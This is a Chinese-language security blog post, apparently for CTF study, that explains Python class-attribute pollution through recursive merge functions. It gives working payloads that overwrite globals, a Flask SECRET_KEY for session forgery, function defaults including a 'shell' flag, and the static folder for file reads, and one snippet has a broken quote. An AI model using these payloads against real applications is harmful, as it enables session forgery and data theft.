@@ -1,0 +1,224 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Python原型链污染 | Iz0fPriestess</title><meta name="author" content="Creexile"><meta name="copyright" content="Creexile"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="是什么 Python中的原型链污染(Prototype Pollution)是指通过修改对象原型链中的属性，对程序的行为产生意外影响或利用漏洞进行攻击的一种技术 在 Python中, 对象的属性和方法可以通过原型链继承来获取. 每个对象都有一个原型, 原型上定义了对象可以访问的属性和方法. 当对象访问属性或方法时, 会先在自身查找, 如果找不到就会去原型链上的上级对象中查找, 原型链污染攻击的思路">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python原型链污染">
+<meta property="og:url" content="https://4reexile.github.io/article/12855/index.html">
+<meta property="og:site_name" content="Iz0fPriestess">
+<meta property="og:description" content="是什么 Python中的原型链污染(Prototype Pollution)是指通过修改对象原型链中的属性，对程序的行为产生意外影响或利用漏洞进行攻击的一种技术 在 Python中, 对象的属性和方法可以通过原型链继承来获取. 每个对象都有一个原型, 原型上定义了对象可以访问的属性和方法. 当对象访问属性或方法时, 会先在自身查找, 如果找不到就会去原型链上的上级对象中查找, 原型链污染攻击的思路">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://4reexile.github.io/img/tx.png">
+<meta property="article:published_time" content="2024-07-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-07-26T14:36:57.574Z">
+<meta property="article:author" content="Creexile">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://4reexile.github.io/img/tx.png"><link rel="shortcut icon" href="/img/prts.ico"><link rel="canonical" href="https://4reexile.github.io/article/12855/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?76992a4541699d4a08e36c0eb02f7796";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Python原型链污染',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-07-26 22:36:57'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tx.png" onerror="onerror=null;src='/img/sddd.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bjt.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Iz0fPriestess"><span class="site-name">Iz0fPriestess</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Python原型链污染</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-07-04T16:00:00.000Z" title="Created 2024-07-05 00:00:00">2024-07-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-07-26T14:36:57.574Z" title="Updated 2025-07-26 22:36:57">2025-07-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E7%9F%A5%E8%AF%86/">Web知识</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.9k</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>是什么</h1>
+<p>Python中的原型链污染(Prototype Pollution)是指通过修改对象原型链中的属性，对程序的行为产生意外影响或利用漏洞进行攻击的一种技术</p>
+<p>在 Python中, 对象的属性和方法可以通过原型链继承来获取. 每个对象都有一个原型, 原型上定义了对象可以访问的属性和方法. 当对象访问属性或方法时, 会先在自身查找, 如果找不到就会去原型链上的上级对象中查找, 原型链污染攻击的思路是通过修改对象原型链中的属性, 使得程序在访问属性或方法时得到不符合预期的结果. 常见的原型链污染攻击包括修改内置对象的原型、修改全局对象的原型等</p>
+<blockquote>
+<p>原理和Nodejs原型链污染的根本原理一样, Nodejs是对键值对的控制来进行污染, 而Python则是对类属性值的污染, 且只能对类的属性来进行污染不能够污染类的方法</p>
+</blockquote>
+<h1>条件</h1>
+<p>原型链污染需要merge合并函数，通过递归合并来修改父级属性，CTF中常见的merge函数如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):  <span class="comment"># src为原字典，dst为目标字典</span></span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):  <span class="comment"># 键值对字典形式</span></span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))  <span class="comment"># 递归到字典最后一层</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:  <span class="comment"># class形式</span></span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))  <span class="comment"># 递归到最终的父类</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure>
+<p>我们可以通过对src的控制，来控制dst的值，来达到我们污染的目的</p>
+<p>注意Object类型不能被污染, 会直接报错</p>
+<h1>例子</h1>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span> : <span class="string">&quot;world&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(father.secret)  <span class="comment"># hello</span></span><br><span class="line"><span class="built_in">print</span>(son_a.secret)  <span class="comment"># hello</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)  <span class="comment"># hello</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)  <span class="comment"># world</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)  <span class="comment"># world</span></span><br><span class="line"><span class="built_in">print</span>(father.secret)  <span class="comment"># world</span></span><br></pre></td></tr></table></figure>
+<p>setattr函数如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">setattr</span>(<span class="params">x, y, v</span>): <span class="comment"># real signature unknown; restored from __doc__</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Sets the named attribute on the given object to the specified value.</span></span><br><span class="line"><span class="string">    setattr(x, &#x27;y&#x27;, v) is equivalent to ``x.y = v&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p>自动获取k和v之后(这里是secret和world), 完成<code>dst.k=v</code>的污染. 通过对子类的&quot;修改&quot;来改变父类的属性, 这样所有的继承都会变为这个变量</p>
+<h1>获取目标类</h1>
+<h2 id="获取父类"><a class="header-anchor" href="#获取父类">¶</a>获取父类</h2>
+<p>例子中通过<code>__base__</code>属性查找到继承的父类</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(father.secret)  <span class="comment"># hello</span></span><br><span class="line"><span class="built_in">print</span>(son_a.__class__)  <span class="comment"># &lt;class &#x27;type&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(son_a.__base__)  <span class="comment"># &lt;class &#x27;__main__.father&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="获取全局变量"><a class="header-anchor" href="#获取全局变量">¶</a>获取全局变量</h2>
+<p><code>__init__</code>初始化方法作为类的一个内置方法, 在没有被重写作为函数的时候, 其数据类型会被当做装饰器, 特点就是都具有一个全局属性<code>__globals__</code>属性.</p>
+<p><code>__globals__</code> 属性返回一个字典, 里面包含了函数定义时所在模块的全局变量</p>
+<p>所以可以通过加上<code>globals</code>来获得和修改对应的全局变量</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    class1 = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">instance = A()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;a&quot;</span>:<span class="number">4</span>,</span><br><span class="line">            <span class="string">&quot;B&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;class1&quot;</span>:<span class="number">5</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(B.class1)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(B.class1)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment"># 2 1</span></span><br><span class="line"><span class="comment"># 5 4</span></span><br></pre></td></tr></table></figure>
+<h2 id="获取其他模块"><a class="header-anchor" href="#获取其他模块">¶</a>获取其他模块</h2>
+<h3 id="import加载"><a class="header-anchor" href="#import加载">¶</a>import加载</h3>
+<p>你就把获取全局变量的变成另一个文件然后引入就好了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;demo&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;a&quot;</span>:<span class="number">4</span>,</span><br><span class="line">                <span class="string">&quot;B&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;class1:5</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="sys模块加载"><a class="header-anchor" href="#sys模块加载">¶</a>sys模块加载</h3>
+<p>借助sys模块中的<code>__module__</code>属性, 这个属性能够加载出来在自运行开始所有已加载的模块, 从而我们能够从属性中获取到我们想要污染的目标模块</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;demo&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;a&quot;</span>:<span class="number">4</span>,</span><br><span class="line">                        <span class="string">&quot;B&quot;</span>:&#123;</span><br><span class="line">                            <span class="string">&quot;class1&quot;</span>:<span class="number">5</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="加载器loader获取sys"><a class="header-anchor" href="#加载器loader获取sys">¶</a>加载器loader获取sys</h3>
+<p>loader加载器在python中的作用是为实现模块加载而设计的类, 其在<code>importlib</code>这一内置模块中有具体实现. 而<code>importlib</code>模块下所有的<code>py</code>文件中均引入了<code>sys</code>模块, 所以只需要获取loader就可以获取sys模块</p>
+<p>获取方式如下: <code>loader.__init__.__globals__['sys']</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math </span><br><span class="line"><span class="built_in">print</span>(math.__loader__)</span><br></pre></td></tr></table></figure>
+<h3 id="spec获取sys"><a class="header-anchor" href="#spec获取sys">¶</a>spec获取sys</h3>
+<p>在python中还存在一个<code>__spec__</code>，包含了关于类加载时候的信息，它定义在<code>Lib/importlib/_bootstrap.py</code>的类<code>ModuleSpec</code>中</p>
+<p>获取方式: <code>&lt;模块名&gt;.__spec__.__init__.__globals__['sys']</code></p>
+<h1>利用方式</h1>
+<p>主要是替换关键内容, 比如密钥/验证密码等</p>
+<h2 id="函数形参默认值替换"><a class="header-anchor" href="#函数形参默认值替换">¶</a>函数形参默认值替换</h2>
+<p><code>__defaults__</code>是python中的一个<strong>元组</strong>, 用于存储函数或方法的默认参数值. 我们通过替换该属性, 来实现对函数位置或者是键值默认值替换</p>
+<p><code>__kwdefaults__</code>是以<strong>字典</strong>形式来进行收录, 同样可以被替换</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># defaults</span></span><br><span class="line">payload_d = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;demo&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__defaults__&quot;</span> : (<span class="literal">True</span>,)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># kwdefaults</span></span><br><span class="line">payload_kwd = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;demo&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__kwdefaults__&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;shell&quot;</span> : <span class="literal">True</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="关键信息替换"><a class="header-anchor" href="#关键信息替换">¶</a>关键信息替换</h2>
+<h3 id="flask密钥替换"><a class="header-anchor" href="#flask密钥替换">¶</a>flask密钥替换</h3>
+<p>在不知道密钥(secret_key)的条件下进行session伪造需要能替换的手段, 这个就不错</p>
+<p>如何替换还要看这个secret_key在哪里, 总之获取全局变量后, 可以通过<code>app.config[&quot;SECRET_KEY&quot;]</code>进行污染</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;config&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;SECRET_KEY&quot;</span> :<span class="string">&quot;apple&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="got-first-request"><a class="header-anchor" href="#got-first-request">¶</a>_got_first_request</h3>
+<p>该值用于判定是否某次请求为自<code>Flask</code>启动后第一次请求, <code>_got_first_request</code>值为假时才会调用装饰器</p>
+<p>所以如果我们想调用第一次访问前的请求，还想要在后续请求中进行使用的话，我们就需要将<code>_got_first_request</code>改成false然后就能够在后续访问的过程中，仍然能够调用装饰器</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;_got_first_request&quot;</span>:<span class="literal">False</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="static-url-path"><a class="header-anchor" href="#static-url-path">¶</a>_static_url_path:</h3>
+<p>当python指定了static静态目录以后，我们再进行访问就会定向到static文件夹下面的对应文件而不会存在目录穿梭的漏洞，但是如果我们想要访问其他文件下面的敏感信息，我们就需要污染这个静态目录，让他自动帮我们实现定向</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;./&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1>其他</h1>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(son_a.__base__)  </span><br><span class="line"><span class="comment"># 获取父类: &lt;class &#x27;__main__.father&#x27;&gt;  </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(son_a.__base__))</span><br><span class="line"><span class="comment"># 获取父类的所有变量, 包括带下划线的</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">getattr</span>(son_a.__base__, <span class="string">&#x27;secret&#x27;</span>))</span><br><span class="line"><span class="comment"># 根据变量名（字符串 attr）动态获取父类中对应变量的值</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取父类所有变量</span></span><br><span class="line">father_attributes = [attr <span class="keyword">for</span> attr <span class="keyword">in</span> <span class="built_in">dir</span>(son_a.__base__) <span class="keyword">if</span> <span class="keyword">not</span> attr.startswith(<span class="string">&#x27;__&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 仅打印无下划线的部分</span></span><br><span class="line"><span class="built_in">print</span>(father_attributes)  <span class="comment"># [&#x27;secret&#x27;, &#x27;name&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 getattr 获取变量的值</span></span><br><span class="line"><span class="keyword">for</span> attr <span class="keyword">in</span> father_attributes:</span><br><span class="line">    value = <span class="built_in">getattr</span>(son_a.__base__, attr)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;attr&#125;</span>: <span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12518">浅谈Python原型链污染及利用方式</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14057">从CISCN2024的sanic引发对python“原型链”的污染挖掘</a></p>
